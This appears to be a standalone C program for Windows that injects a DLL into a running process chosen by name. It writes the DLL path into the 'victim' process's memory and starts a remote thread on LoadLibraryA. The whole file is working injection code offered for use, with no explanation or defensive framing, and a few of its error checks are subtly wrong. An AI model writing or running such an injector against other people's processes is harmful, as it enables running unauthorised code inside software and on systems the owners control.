#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

DWORD FindPID(char *procName);

int main(int argc, char *argv[]){

    if (argv[1] == NULL){
        puts("[!] Missing process name argument.");
        exit(-1);
    }

    if (argv[2] == NULL){
        puts("[!] Missing DLL path argument.");
        exit(-1);
    }

    if(GetFileAttributesA(argv[2]) == INVALID_FILE_ATTRIBUTES){
        printf("[!] DLL file \"%s\" does not exist.", argv[2]);
        exit(-1);
    }

    DWORD pid = FindPID(argv[1]);
    
    HANDLE hVictim = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hVictim == INVALID_HANDLE_VALUE){
        printf("[!] Unable to open handle to PID %i", pid);
        exit(-1);
    }

    LPVOID victimAlloc = VirtualAllocEx(hVictim, NULL, strlen(argv[2]), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("[+] Allocated memory in remote process at address %p\n", victimAlloc);

    if (!WriteProcessMemory(hVictim, victimAlloc, argv[2], strlen(argv[2]) + 1, NULL)){
        puts("[!] Writing DLL path to remote process memory failed.");
    } else {
        printf("[+] \"%s\" written to allocated memory.\n", argv[2]);
    }
    
    HANDLE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32 == INVALID_HANDLE_VALUE){
        puts("[!] Unable to open handle to Kernel32.dll.");
        exit(-1);
    } else {
        puts("[+] Handle opened to Kernel32.dll");
    }

    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL){
        puts("[!] Unable to obtain a pointer to LoadLibraryA.");
        exit(-1);
    } else {
        printf("[+] Obtained pointer to LoadLibraryA at %p\n", pLoadLibrary);
    }

    HANDLE hInjectedDLL = CreateRemoteThread(hVictim, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, victimAlloc, 0, NULL);
    if (hInjectedDLL == INVALID_HANDLE_VALUE){
        puts("[!] Failed to create remote thread.");
        exit(-1);
    }
    printf("[+] \"%s\" successfully injected into \"%s\".", argv[2], argv[1]);

    return 0;
}

DWORD FindPID(char *procName){
    HANDLE hSnapshot;
    DWORD pid = 0;
    PROCESSENTRY32 proc;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE){
        puts("[!] Invalid snapshot handle.");
        exit(-1);
    }

    proc.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &proc)){
        CloseHandle(hSnapshot);
        puts("[!] No processes found.");
        exit(-1);
    }

    do {
        if (!strcmp(proc.szExeFile, procName)){
            pid = proc.th32ProcessID;
            printf("[+] Process \"%s\" found at PID %i.\n", procName, pid);
            break;
        }
    } while (Process32Next(hSnapshot, &proc));
    
    CloseHandle(hSnapshot);
   
    if (!pid){
        printf("[!] Process \"%s\" not found.", procName);
        exit(-1);
    } else{
        return pid;
    }
}